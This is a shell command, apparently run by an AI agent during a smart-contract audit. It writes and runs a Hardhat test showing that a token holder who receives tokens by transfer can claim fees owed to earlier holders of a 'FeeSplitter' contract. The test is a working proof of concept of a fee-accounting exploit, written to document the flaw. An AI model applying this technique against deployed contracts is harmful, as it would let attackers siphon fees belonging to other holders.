inner_command:
set -e
cd /home/agent/audit
cat > test/_audit_temp.ts <<'EOF'
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { parseEther } from '@ethersproject/units';
import { deployCurveContracts } from './test.helpers';

describe('audit temp', () => {
  it('shows transferred-in holder can steal prior holder fees', async () => {
    const [owner, friend] = await ethers.getSigners();
    const c = await deployCurveContracts();
    const s = await ethers.getContractAt('FeeSplitter', await c.feeRedistributor());

    const holdersFee = parseEther('0.1');
    await c.setMaxFeePercent(holdersFee);
    await c.setProtocolFeePercent(0, owner.address);
    await c.setExternalFeePercent(0, 0, holdersFee);

    await c.buyCurvesToken(owner.address, 1);
    let buyPrice = await c.getBuyPrice(owner.address, 1);
    let totalPayment = buyPrice.add(buyPrice.mul(holdersFee).div(parseEther('1')));
    await c.connect(friend).buyCurvesToken(owner.address, 1, { value: totalPayment });

    const ownerClaimBefore = await s.getClaimableFees(owner.address, owner.address);
    expect(ownerClaimBefore).to.equal(parseEther('0.00000625'));

    await c.connect(friend).transferCurvesToken(owner.address, owner.address, 1);

    buyPrice = await c.getBuyPrice(owner.address, 1);
    totalPayment = buyPrice.add(buyPrice.mul(holdersFee).div(parseEther('1')));
    await c.connect(friend).buyCurvesToken(owner.address, 1, { value: totalPayment });

    const ownerClaimAfter = await s.getClaimableFees(owner.address, owner.address);
    const friendClaimAfter = await s.getClaimableFees(owner.address, friend.address);
    console.log('ownerClaimBefore', ownerClaimBefore.toString());
    console.log('ownerClaimAfter', ownerClaimAfter.toString());
    console.log('friendClaimAfter', friendClaimAfter.toString());
  });
});
EOF
npx hardhat test test/_audit_temp.ts

